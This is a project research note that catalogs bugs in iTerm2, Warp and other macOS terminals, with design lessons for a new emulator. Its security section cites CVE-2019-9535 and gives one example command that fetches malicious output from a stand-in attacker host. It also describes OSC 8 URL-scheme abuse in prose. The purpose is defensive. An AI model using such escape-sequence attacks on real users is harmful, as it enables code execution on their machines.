---
title: Terminal Bugs & Lessons Learned (iTerm2, Warp, Others)
description: Known bugs and issues in iTerm2 and Warp terminal emulators that Crux should learn from and avoid
phase: all
topics: [macos, terminal-emulation, ime, performance, architecture]
related: [ime-clipboard.md, terminal-emulation.md, terminal-architecture.md]
---

# Terminal Bugs & Lessons Learned

**Research Date**: 2026-02-12

This document catalogs known bugs, design mistakes, and lessons learned from existing macOS terminal emulators (primarily iTerm2 and Warp) to inform Crux development and avoid repeating historical mistakes.

## Table of Contents

1. [CJK/IME Issues](#cjkime-issues)
2. [Performance Issues](#performance-issues)
3. [Architecture & Design Issues](#architecture--design-issues)
4. [Security Vulnerabilities](#security-vulnerabilities)
5. [macOS Integration Issues](#macos-integration-issues)
6. [Shell & SSH Compatibility](#shell--ssh-compatibility)
7. [GPU Rendering Pitfalls](#gpu-rendering-pitfalls)
8. [User Experience Anti-Patterns](#user-experience-anti-patterns)
9. [Key Takeaways for Crux](#key-takeaways-for-crux)

---

## CJK/IME Issues

### The Real Cursor vs. Fake Cursor Problem

**Issue**: The most pervasive CJK IME bug across multiple terminals (iTerm2, Warp, Alacritty, Kitty, Claude Code).

**Root Cause**: Terminal applications render a "fake cursor" in their TUI but don't move the **real terminal cursor** to the caret position. macOS IME anchors the preedit/candidate window to the real cursor position (bottom-left or last cursor location), not the visual cursor.

**Symptoms**:
- IME candidate window appears at wrong position (bottom-left corner)
- Preedit text overlay doesn't follow caret movement
- Candidate window doesn't move with left/right caret navigation

**Solution**: Move the real terminal cursor to the caret position after each render while preserving SGR state. This makes IME preedit/candidate windows follow the caret correctly.

**Crux Impact**: CRITICAL. This is documented in `research/platform/ime-clipboard.md` as a must-fix. The fix requires synchronizing real cursor with visual cursor position.

**References**:
- [Claude Code Issue #16372](https://github.com/anthropics/claude-code/issues/16372)
- [Warp Issue #6891](https://github.com/warpdotdev/warp/issues/6891)
- [Alacritty Issue #6942](https://github.com/alacritty/alacritty/issues/6942)

---

### iTerm2 CJK-Specific Bugs

#### 1. CJK Compatibility Ideographs Auto-Conversion

**Bug**: CJK compatibility ideographs automatically convert to non-compatibility counterparts.

**Status**: Long-standing issue.

**Lesson**: Don't normalize Unicode characters without user consent. Preserve exact character codes.

**Reference**: [iTerm2 Issue #5098](https://gitlab.com/gnachman/iterm2/-/issues/5098)

#### 2. Candidate Window in Fullscreen Apps

**Bug**: Input candidate window not visible when hotkey window overlays a fullscreen application.

**Root Cause**: macOS window level conflicts between fullscreen apps and floating windows.

**Reference**: [iTerm2 Issue #7521](https://gitlab.com/gnachman/iterm2/-/issues/7521)

---

### Warp CJK-Specific Bugs

#### 1. Keybindings Don't Work with Non-English IME

**Bug**: Shortcuts like `⌘I`, `⌘P` don't work when Korean/Chinese IME is active.

**Root Cause**: Keybindings rely on current input source. When Korean IME is active, `⌘P` is interpreted as `⌘ㅔ` (different key code).

**Status**: Ongoing issue (reported 2025).

**Lesson**: Keybindings should work at the physical key level, not the character level. Map shortcuts to key codes, not characters.

**Crux Impact**: HIGH. GPUI keyboard event handling must account for this.

**References**:
- [Warp Issue #341](https://github.com/warpdotdev/Warp/issues/341)
- [Warp Issue #8547](https://github.com/warpdotdev/warp/issues/8547)

#### 2. Korean Characters Display Incorrectly

**Bug**: Korean characters not rendered correctly; files with Korean names show incompletely in `ls` output.

**Status**: Reported 2025.

**Reference**: [Warp Issue #428](https://github.com/warpdotdev/warp/issues/428)

#### 3. Japanese Hiragana Preedit Not Visible

**Bug**: When typing Japanese, the hiragana being input temporarily is not displayed before conversion to kanji.

**Root Cause**: Lack of preedit overlay rendering.

**Reference**: [Warp Issue #4529](https://github.com/warpdotdev/warp/issues/4529)

#### 4. Sidebar Cannot Display Chinese Filenames

**Bug**: Warp sidebar (not terminal itself) cannot render Chinese characters in filenames correctly.

**Root Cause**: UI component-specific rendering issue.

**Lesson**: All UI components need proper Unicode/CJK support, not just the terminal canvas.

**Reference**: [Warp Issue #7436](https://github.com/warpdotdev/warp/issues/7436)

---

### Alacritty & Kitty CJK Issues

#### Alacritty: Double Space on Korean Input

**Bug**: When in Korean IME mode, pressing spacebar once results in two spaces.

**Status**: Reported 2024.

**Reference**: [Alacritty Issue #8079](https://github.com/alacritty/alacritty/issues/8079)

#### Kitty: GLFW IME Limitations

**Bug**: IME doesn't work with Kitty due to GLFW limitations (on X11).

**Workaround**: Works on Wayland with certain IME systems (kime).

**Lesson**: Graphics framework choice affects IME support. GLFW has known IME limitations.

**Reference**: [Kitty Issue #462](https://github.com/kovidgoyal/kitty/issues/462)

---

## Performance Issues

### iTerm2 Performance Problems

#### 1. CPU Rendering Bottleneck

**Issue**: iTerm2 is CPU-rendered, fundamentally slower than GPU-accelerated terminals.

**Measured Impact**: macOS Core Text rendering takes **>150ms per frame** on 4K displays on some MacBook models.

**Result**: Visible lag, especially with tmux and vim. Fans spin up on MacBook Pro.

**Lesson**: GPU acceleration is essential for modern terminal performance. CPU rendering doesn't scale to high-DPI displays.

**Crux Impact**: CRITICAL. Validates Crux's Metal rendering choice.

**References**:
- [iTerm2 Issue #7333](https://gitlab.com/gnachman/iterm2/-/issues/7333)
- [Making iTerm2 Render Faster](https://vivi.sh/blog/technical/making-terminal-render-faster/index)
- [Hacker News Discussion](https://news.ycombinator.com/item?id=14800195)

#### 2. Slow Startup Times

**Bug**: iTerm2 can take 5-10 seconds to show prompt on startup.

**Common Causes**:
- Apple system logs (`/private/var/log/asl/*.asl`) accumulation
- Slow shell initialization
- Profile misconfiguration

**Lesson**: Terminal startup should be instant. Profile loading and shell spawning must be optimized.

**References**:
- [iTerm2 Issue #7982](https://gitlab.com/gnachman/iterm2/-/issues/7982)
- [iTerm2 Issue #9872](https://gitlab.com/gnachman/iterm2/-/issues/9872)

#### 3. Memory Leaks

**Bug**: Multiple reports of memory leaks, with iTerm2 consuming 5-9GB RAM.

**Common Cause**: Unlimited scrollback buffer.

**Status**: Ongoing issue across versions.

**Lesson**: Scrollback must have bounded memory usage. Consider ring buffer with configurable limits and memory-mapped storage for large buffers.

**References**:
- [iTerm2 Issue #10766](https://gitlab.com/gnachman/iterm2/-/issues/10766)
- [iTerm2 Issue #9221](https://gitlab.com/gnachman/iterm2/-/issues/9221)
- [iTerm2 Issue #8592](https://gitlab.com/gnachman/iterm2/-/issues/8592)

#### 4. Performance Degradation Over Time

**Bug**: iTerm2 becomes slow over time on macOS High Sierra and later.

**Lesson**: Profile for memory leaks and resource accumulation. Long-running sessions must maintain performance.

**Reference**: [iTerm2 Issue #6939](https://gitlab.com/gnachman/iterm2/-/issues/6939)

---

### Warp Performance Problems

#### 1. Discrete GPU Battery Drain

**Bug**: On dual-GPU MacBooks, Warp forces high-power discrete GPU usage even when idle, rapidly draining battery.

**Root Cause**: Background window re-rendering for cursor blinking.

**Workaround**: Setting "Prefer rendering new windows with integrated GPU" in preferences.

**Lesson**: GPU usage must be power-aware. Idle terminals should use integrated GPU. Cursor blinking should not trigger full window re-renders.

**Crux Impact**: HIGH. GPUI rendering loop must be power-efficient.

**References**:
- [Warp Issue #76](https://github.com/warpdotdev/Warp/issues/76)
- [Warp Issue #2114](https://github.com/warpdotdev/Warp/issues/2114)
- [Warp Issue #2223](https://github.com/warpdotdev/Warp/issues/2223)

#### 2. Excessive CPU/GPU While Idle (Windows)

**Bug**: On Windows, Warp uses excessive CPU/GPU while idle.

**Status**: Reported 2025.

**Lesson**: Rendering should pause or drastically reduce when terminal is idle.

**Reference**: [Warp Issue #7561](https://github.com/warpdotdev/warp/issues/7561)

#### 3. Memory Leak

**Bug**: Warp allocated ~9.5GB virtual memory.

**Status**: Reported 2025.

**Reference**: [Warp Issue #7101](https://github.com/warpdotdev/Warp/issues/7101)

#### 4. Crashes Under Heavy Load

**Bug**: Terminal crashes when heavy processing occurs, especially over networks with multiple tabs running agents.

**Status**: Reported 2025.

**Lesson**: Terminal must be resilient to high I/O throughput. Background threads/async I/O essential.

**Reference**: [Warp Issue #8280](https://github.com/warpdotdev/warp/issues/8280)

---

## Architecture & Design Issues

### Warp: Block Mode Workflow Conflicts

**Issue**: Warp's "block" UI paradigm (treating command output as discrete UI elements) conflicts with traditional terminal workflows.

**User Complaints**:
- Blocks consume excessive screen real estate even in "compact mode"
- Mouse input captured by blocks, requiring "Cmd+U" to refocus
- Cursor position unclear in Rails console and REPLs
- Text deletion doesn't work as expected
- Incompatible with tmux/vim power users

**Lesson**: Don't force new paradigms on terminal users. Traditional continuous character grid model exists for a reason. UI innovations should be **optional**, not mandatory.

**Crux Impact**: MEDIUM. Crux should remain a traditional terminal emulator. Advanced features (IPC, MCP) are **extensions**, not replacements for core terminal behavior.

**Reference**: [Warp Issue #3189](https://github.com/warpdotdev/Warp/issues/3189)

---

### iTerm2: Configuration Complexity

**Issue**: iTerm2 has overwhelming configuration options, including "hidden settings" only accessible via terminal commands.

**User Impact**:
- Difficult to optimize without advanced knowledge
- Breaking changes in profiles can cause iTerm2 to crash on startup
- No clear path from defaults to optimized setup

**Lesson**: Provide sane defaults that work well out-of-the-box. Advanced settings should be discoverable, not hidden.

**Crux Impact**: MEDIUM. Crux config system (Phase 5) should follow Ghostty's approach: single config file, clear documentation, sensible defaults.

**References**:
- [iTerm2 Hidden Settings](https://iterm2.com/documentation-hidden-settings.html)
- [iTerm2 Configuration Guide](https://www.oreateai.com/blog/complete-guide-to-iterm2-configuration-and-optimization/0a929df5ac1b584712330cebe1bef982)

---

### Warp: Proprietary Lock-In & Privacy Backlash

**Issue**: Warp initially required login/account creation to use the terminal, generating massive developer backlash.

**User Concerns**:
- Privacy: Why does a local terminal need cloud authentication?
- Telemetry: What data is being sent to Segment?
- Trust: Terminal handles sensitive commands and credentials
- Philosophy: Goes against open-source ethos

**Warp's Response**: Removed login requirement in November 2024, made telemetry opt-in.

**Lesson**: Developer tools must respect privacy by default. Never require accounts for local-first applications. Telemetry must be opt-in and transparent.

**Crux Impact**: LOW (Crux is open-source, local-first). But: MCP server in Phase 6 must be privacy-conscious.

**References**:
- [Warp: Lifting the Login Requirement](https://www.warp.dev/blog/lifting-login-requirement)
- [Warp Issue #1838](https://github.com/warpdotdev/Warp/issues/1838)
- [Hacker News Discussion](https://news.ycombinator.com/item?id=42247583)

---

## Security Vulnerabilities

### iTerm2: Critical tmux Integration RCE (CVE-2019-9535)

**Severity**: CRITICAL

**Bug**: Remote code execution via tmux integration feature.

**Attack Vector**: Attacker-controlled SSH server or malicious output (e.g., `curl http://attacker.com` or `tail -f /var/log/apache2/referer_log`) can execute commands on user's computer.

**Root Cause**: Insufficient sanitization of escape sequences in tmux integration mode.

**Fix**: Patched in iTerm2 3.3.6 (2019).

**Lesson**: **ALL escape sequence parsing must assume hostile input.** Never trust terminal output, even from "trusted" sources. Implement strict validation and sandboxing.

**Crux Impact**: CRITICAL. VT parser (`alacritty_terminal`) must be audited for injection vulnerabilities. Custom OSC/DCS handlers for IPC (Phase 2) need security review.

**References**:
- [Mozilla Security Blog](https://blog.mozilla.org/security/2019/10/09/iterm2-critical-issue-moss-audit/)
- [CISA Alert](https://www.cisa.gov/news-events/alerts/2019/10/09/iterm2-vulnerability)
- [Hacker News Discussion](https://news.ycombinator.com/item?id=21203564)

---

### iTerm2: OSC 8 URL Handler Exploitation (2024)

**Severity**: HIGH

**Bug**: Vulnerability in OSC 8 URL handling allowing arbitrary application launch via URL schemes.

**Attack Vector**: Terminal output containing crafted OSC 8 sequences can pop Calculator or other apps.

**Additional Bug**: SSH URL scheme argument injection allowing arbitrary file write.

**Lesson**: URL handlers and custom protocol schemes are high-risk attack surfaces. Implement strict allowlists and sanitization.

**Crux Impact**: MEDIUM. Phase 4 includes clickable links. Must use macOS URL validation APIs and allowlist safe schemes (http, https, file).

**Reference**: [Security Researcher Blog](https://vin01.github.io/piptagole/escape-sequences/iterm2/hyper/url-handlers/code-execution/2024/05/21/arbitrary-url-schemes-terminal-emulators.html)

---

## macOS Integration Issues

### iTerm2: Fullscreen & Spaces Management

**Bugs**:
1. Fullscreen window remains on desktop space instead of moving to new fullscreen space
2. Fullscreen side-by-side windows resize incorrectly after wake
3. Hotkey window no longer opens over fullscreen apps (macOS 11.1+)
4. Fullscreen windows get attached to specific spaces

**Root Cause**: macOS window level API changes and Mission Control integration complexity.

**Lesson**: macOS fullscreen behavior is fragile. Test across macOS versions. Provide both native fullscreen (NSWindowCollectionBehaviorFullScreenPrimary) and instant fullscreen options.

**Crux Impact**: MEDIUM. Window management is Phase 2 scope.

**References**:
- [iTerm2 Issue #7432](https://gitlab.com/gnachman/iterm2/-/issues/7432)
- [iTerm2 Issue #9404](https://gitlab.com/gnachman/iterm2/-/issues/9404)
- [iTerm2 Issue #1138](https://gitlab.com/gnachman/iterm2/-/issues/1138)

---

### iTerm2: Shell Integration OSC Compatibility

**Issues**:
1. Proprietary escape codes don't work in tmux/screen
2. Multiline commands not supported (shell-specific PS2 differences)
3. Shell integration appears as literal text in some configurations

**Lesson**: Shell integration via escape sequences is fragile. Document limitations. Provide fallbacks when integration unavailable.

**Crux Impact**: MEDIUM. Phase 2 includes shell integration. Use existing standards (OSC 7, OSC 133) where possible.

**References**:
- [iTerm2 Proprietary Escape Codes](https://iterm2.com/documentation-escape-codes.html)
- [iTerm2 Issue #7138](https://gitlab.com/gnachman/iterm2/-/issues/7138)

---

### iTerm2: tmux Integration Bugs

**Known Issues**:
1. Tab with tmux window cannot contain non-tmux split panes (design limitation)
2. Aggressive-resize option incompatible with tmux integration
3. Panel management bugs when killing sessions with multiple split panes
4. SSH tmux sessions occasionally lose individual windows
5. Compatibility broken with tmux 3.3+

**Lesson**: Deep tmux integration is complex and fragile. Phase 5 tmux compatibility should focus on **standard tmux protocol**, not custom integration layer.

**References**:
- [iTerm2 tmux Integration Docs](https://iterm2.com/documentation-tmux-integration.html)
- [iTerm2 Issue #10435](https://gitlab.com/gnachman/iterm2/-/issues/10435)
- [iTerm2 Issue #7770](https://gitlab.com/gnachman/iterm2/-/issues/7770)

---

### Warp: macOS Local Network Permission

**Bug**: On macOS, SSH fails with "Undefined error: 0" due to missing Local Network permission.

**Root Cause**: macOS 14+ requires explicit Local Network permission for apps to access LAN devices.

**Fix**: System Settings > Privacy & Security > Local Network > Enable Warp.

**Lesson**: Modern macOS requires explicit privacy permissions. Terminal emulators need Local Network entitlement for SSH. Document permission requirements clearly.

**Crux Impact**: LOW. Standard macOS entitlement. Add to distribution checklist (Phase 6).

**Reference**: [Warp Known Issues](https://docs.warp.dev/support-and-billing/known-issues)

---

## Shell & SSH Compatibility

### Warp: SSH Connection Issues (2025-2026)

**Bugs**:
1. Random SSH connection disconnects without user action
2. SSH login hangs (works fine in standard terminals)
3. Port forwarding causes session termination on connection refused
4. TailScale SSH connections loop indefinitely
5. General SSH instability with "SSH Wrapper" for block mode

**Root Cause**: Warp's SSH wrapper for "Blocks over SSH" feature interferes with standard SSH behavior.

**Lesson**: Don't intercept/wrap SSH. It's a complex protocol with many edge cases. Let SSH work transparently.

**Crux Impact**: LOW. Crux is a standard terminal emulator. SSH just works via PTY.

**References**:
- [Warp Issue #8111](https://github.com/warpdotdev/warp/issues/8111)
- [Warp Issue #6183](https://github.com/warpdotdev/warp/issues/6183)
- [Warp Issue #7641](https://github.com/warpdotdev/warp/issues/7641)

---

### Warp: Shell Compatibility Issues

**Issues**:
1. Fish shell crashes on startup
2. Remote fish shell initialization errors (bash/zsh init sent to fish)
3. Aliases don't transfer over SSH
4. Incompatibilities with oh-my-fish, oh-my-bash
5. Multi-line/right-sided prompts only supported in zsh/fish, not bash

**Root Cause**: Warp injects shell-specific initialization code, which breaks when shell type detection fails or custom prompts interfere.

**Lesson**: Shell initialization must be robust and shell-agnostic. Don't assume shell type. Parse prompt strictly or use fallback rendering.

**Crux Impact**: MEDIUM. Phase 2 shell integration should use standard APIs (OSC 133, OSC 7) rather than shell-specific injection.

**References**:
- [Warp Supported Shells](https://docs.warp.dev/getting-started/supported-shells)
- [Warp Issue #5142](https://github.com/warpdotdev/Warp/issues/5142)
- [Warp Issue #2454](https://github.com/warpdotdev/Warp/issues/2454)

---

### iTerm2: Semantic History Bugs

**Issues**:
1. No feedback when semantic history command fails
2. Doesn't work in tmux
3. Network share support causes hangs (slow filesystem blocks entire app)
4. Soft boundaries not respected for prefix/suffix text

**Lesson**: File/URL detection is heuristic and error-prone. Semantic history on network mounts needs background threads to prevent UI hangs.

**Crux Impact**: LOW (Phase 4 feature). Implement async URL/file detection.

**References**:
- [iTerm2 Issue #7915](https://gitlab.com/gnachman/iterm2/-/issues/7915)
- [iTerm2 Issue #7464](https://gitlab.com/gnachman/iterm2/-/issues/7464)
- [iTerm2 Issue #8227](https://gitlab.com/gnachman/iterm2/-/issues/8227)

---

## GPU Rendering Pitfalls

### Warp: Metal API Complexity

**Finding**: Warp chose Metal over OpenGL for macOS.

**Challenge**: Metal is low-level, only allows rendering triangles via shaders or texture sampling. No high-level text/UI APIs.

**Implication**: Custom text rendering, glyph caching, and UI element rendering must be implemented from scratch.

**Benefit**: Better performance potential (400+ fps vs CPU rendering). Better Xcode debugging tools.

**Lesson**: Metal enables high performance but requires significant implementation effort. GPUI abstracts this complexity for Crux.

**Crux Impact**: LOW. GPUI handles Metal text rendering. But: understand performance characteristics and profiling tools.

**Reference**: [Warp: How Warp Works](https://www.warp.dev/blog/how-warp-works)

---

### Ghostty: Metal Rendering Lessons (2025-2026)

**Recent Bugs**:
1. Control-modified keys broken with Kitty Keyboard protocol (Neovim, Fish 4.0)
2. Critical deadlock scenario (all platforms)
3. macOS 26 (Tahoe) tab bar incompatibilities

**Key Lesson**: Tab title override logic needed in core, not per-platform. Implementing separately for macOS and GTK is tedious and error-prone.

**Crux Impact**: MEDIUM. Phase 2 tab implementation should centralize state management in Rust core, not per-platform UI code.

**References**:
- [Ghostty 1.2.3 Release Notes](https://ghostty.org/docs/install/release-notes/1-2-3)
- [Ghostty Issue #10345](https://github.com/ghostty-org/ghostty/issues/10345)

---

### Font Rendering: Ligature Performance

**Issue**: Ligatures add rendering complexity and performance overhead.

**iTerm2**: Ligatures use CoreText (significantly slower than Core Graphics).

**Warp**: Ligatures not supported by GPU renderer, would reduce performance.

**Lesson**: Ligature support is a trade-off. If implemented, needs glyph caching and GPU-friendly rendering path. Consider making ligatures optional.

**Crux Impact**: LOW (not Phase 1). If added later, use GPUI's text shaping APIs carefully.

**References**:
- [iTerm2 Fonts Documentation](https://iterm2.com/documentation-fonts.html)
- [Font Shaping Support Gist](https://gist.github.com/XVilka/070ed8b1c1186097cad65ef49220175a)

---

## User Experience Anti-Patterns

### Clipboard Paste Issues

**iTerm2 Bugs**:
1. Paste doubles clipboard content
2. Large pastes lose characters
3. URL escaping issues on paste

**Lesson**: Clipboard handling needs careful testing. Large paste should be throttled or chunked to prevent PTY buffer overflow.

**Crux Impact**: MEDIUM. Phase 3 clipboard implementation must handle large pastes gracefully.

**References**:
- [iTerm2 Issue #11228](https://gitlab.com/gnachman/iterm2/-/issues/11228)
- [iTerm2 Issue #4789](https://gitlab.com/gnachman/iterm2/-/issues/4789)

---

### Warp: Crashes on Startup

**Bugs**:
1. Crashes if command executed immediately after launch with anaconda auto-activate
2. Terminal breaks on upgrade (commands dump shell code on screen)
3. Gets stuck on "Warping" indefinitely, losing work

**Lesson**: Initialization race conditions are common. Terminal must gracefully handle rapid input during startup.

**Crux Impact**: LOW. Ensure PTY initialization completes before accepting input.

**References**:
- [Warp Issue #7898](https://github.com/warpdotdev/warp/issues/7898)
- [Warp Issue #7090](https://github.com/warpdotdev/warp/issues/7090)
- [Warp Issue #7801](https://github.com/warpdotdev/warp/issues/7801)

---

## Key Takeaways for Crux

### Critical (Phase 1)

1. **Real Cursor Sync for IME**: Move real cursor to visual cursor position after each render. This is THE solution to CJK IME positioning. (See `ime-clipboard.md`)

2. **GPU Acceleration Validated**: iTerm2's CPU rendering proves GPU is essential for modern terminals. Metal via GPUI is the right choice.

3. **Security-First Escape Sequence Parsing**: iTerm2's CVE-2019-9535 shows escape sequences are attack surfaces. Never trust terminal output. Audit `alacritty_terminal` parser for injection risks.

4. **Power-Efficient Rendering**: Warp's discrete GPU battery drain shows importance of idle optimization. Cursor blinking must not trigger full re-renders.

### High Priority (Phase 2-3)

5. **Keybindings at Physical Key Level**: Warp's IME keybinding bugs show shortcuts must map to key codes, not characters. GPUI keyboard events must handle this correctly.

6. **Bounded Scrollback Memory**: iTerm2 memory leaks demonstrate need for ring buffer with configurable limits. Consider memory-mapped storage for large buffers.

7. **Async I/O for High Throughput**: Warp crashes under heavy load show terminal must handle high I/O volume gracefully. Background threads essential.

8. **Standard SSH/tmux Support**: Don't intercept or wrap. Just provide transparent PTY. Complex integration layers (like Warp's SSH wrapper or iTerm2's tmux integration) are fragile.

9. **Clipboard Security**: Phase 3 rich clipboard needs careful sanitization. Large pastes need throttling.

### Medium Priority (Phase 4-5)

10. **URL Handler Security**: Phase 4 clickable links need strict allowlists. OSC 8 is an attack surface.

11. **Shell Integration via Standards**: Use OSC 7 (directory), OSC 133 (command marks), not custom injection. Works across shells.

12. **Fullscreen Testing Across macOS Versions**: macOS window management APIs change between versions. Test on multiple macOS releases.

13. **Configuration Philosophy**: Follow Ghostty model: single config file, sane defaults, clear docs. Avoid iTerm2's "hidden settings" complexity.

### Low Priority (Phase 6)

14. **Ligatures Are Optional**: If added, needs GPU-friendly rendering. Not essential for Phase 1.

15. **Privacy by Default**: MCP server must be local-first. No required accounts. Telemetry opt-in.

16. **macOS Entitlements**: Local Network permission required for SSH. Add to distribution checklist.

---

## Recommendations for PLAN.md Updates

Based on this research, suggest adding to `PLAN.md`:

### Phase 1 Additions

- [ ] Test real cursor synchronization with Korean IME (Hangul 2-Set)
- [ ] Profile GPU memory usage and power consumption (discrete vs integrated)
- [ ] Security audit of `alacritty_terminal` escape sequence parser

### Phase 2 Additions

- [ ] Implement bounded scrollback with memory-mapped overflow
- [ ] Add async PTY I/O handling with backpressure
- [ ] Test tab title state management (centralized in Rust, not per-platform)
- [ ] Verify keybindings work with CJK IME active

### Phase 3 Additions

- [ ] Implement clipboard paste throttling for large content (>1MB)
- [ ] Add unit tests for IME preedit rendering at various cursor positions

### Phase 4 Additions

- [ ] Implement URL scheme allowlist (http, https, file only)
- [ ] Add async file existence checks for semantic history (prevent UI hangs on network mounts)

### Phase 5 Additions

- [ ] Test tmux compatibility without custom integration layer
- [ ] Document shell integration escape sequence support (OSC 7, OSC 133)

### Phase 6 Additions

- [ ] Add Local Network entitlement to code signing
- [ ] Document privacy policy for MCP server (local-first, no telemetry)

---

## Sources

### iTerm2 Issues
- [CJK Compatibility Ideographs](https://gitlab.com/gnachman/iterm2/-/issues/5098)
- [Candidate Window Fullscreen](https://gitlab.com/gnachman/iterm2/-/issues/7521)
- [Performance Issues](https://gitlab.com/gnachman/iterm2/-/issues/7333)
- [Slow Startup](https://gitlab.com/gnachman/iterm2/-/issues/7982)
- [Memory Leak](https://gitlab.com/gnachman/iterm2/-/issues/10766)
- [tmux Integration](https://gitlab.com/gnachman/iterm2/-/issues/10435)
- [Fullscreen Spaces](https://gitlab.com/gnachman/iterm2/-/issues/7432)
- [Semantic History](https://gitlab.com/gnachman/iterm2/-/issues/7915)

### Warp Issues
- [IME Support](https://github.com/warpdotdev/warp/issues/6891)
- [Keybinding IME](https://github.com/warpdotdev/warp/issues/341)
- [Discrete GPU Battery](https://github.com/warpdotdev/warp/issues/76)
- [SSH Issues](https://github.com/warpdotdev/warp/issues/8111)
- [Block Mode Complaints](https://github.com/warpdotdev/warp/issues/3189)
- [Login Requirement](https://github.com/warpdotdev/warp/issues/1838)

### Security
- [Mozilla iTerm2 CVE](https://blog.mozilla.org/security/2019/10/09/iterm2-critical-issue-moss-audit/)
- [CISA iTerm2 Alert](https://www.cisa.gov/news-events/alerts/2019/10/09/iterm2-vulnerability)
- [URL Handler Vulnerability](https://vin01.github.io/piptagole/escape-sequences/iterm2/hyper/url-handlers/code-execution/2024/05/21/arbitrary-url-schemes-terminal-emulators.html)

### Architecture
- [Warp How It Works](https://www.warp.dev/blog/how-warp-works)
- [Claude Code IME Issue](https://github.com/anthropics/claude-code/issues/16372)
- [Making iTerm2 Faster](https://vivi.sh/blog/technical/making-terminal-render-faster/index)

### Ghostty
- [Ghostty 1.2.3 Release](https://ghostty.org/docs/install/release-notes/1-2-3)
- [Ghostty Issue #10345](https://github.com/ghostty-org/ghostty/issues/10345)

### Other Terminals
- [Alacritty Issue #6942](https://github.com/alacritty/alacritty/issues/6942)
- [Kitty Issue #462](https://github.com/kovidgoyal/kitty/issues/462)
